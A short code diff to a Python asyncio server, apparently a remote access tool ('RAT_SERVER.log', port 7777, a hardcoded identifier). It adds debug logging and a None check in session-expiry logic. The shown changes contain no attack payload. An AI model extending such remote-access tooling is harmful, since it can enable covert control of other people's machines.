@@ -5,6 +5,7 @@ from secrets import compare_digest
 from datetime import datetime
 from os import execl
 from sys import executable
+import logging
 import hmac
 # server
 IDN = 'xmsalxaca8cac3cac9vr8gvr2br9bbn2n'
@@ -344,7 +345,7 @@ class SGhiosProtocol(asyncio.Protocol):
         if it was expired then remove the connection name of sessions dict and return true 
         if isnnot the case then return false'''
          
-        if SGhiosProtocol.MAX_SESSION_TIME - self._Sessions.get(self._transport.get_extra_info('peername')[0])[1].minute == 0:
+        if (self._Sessions.get(self._transport.get_extra_info('peername')[0]) != None) and SGhiosProtocol.MAX_SESSION_TIME - self._Sessions.get(self._transport.get_extra_info('peername')[0])[1].minute == 0:
             self.removeCurrentSession() 
             return True
         return False
@@ -504,7 +505,11 @@ class TCP_Server(Server):
 #    def __init__(self):
 #        super().__init__(self)
 #        pass
-#    
+# 
+def loggEvents():
+    logging.basicConfig(filename='RAT_SERVER.log', level=logging.DEBUG)
+    logging.Formatter('%(asctime)s :: %(levelname)s :: %(message)s')
 if __name__ == '__main__':
+    loggEvents()
     print(f'starting serving at {socket.gethostname()} on 7777')
     TCP_Server(port=7777)
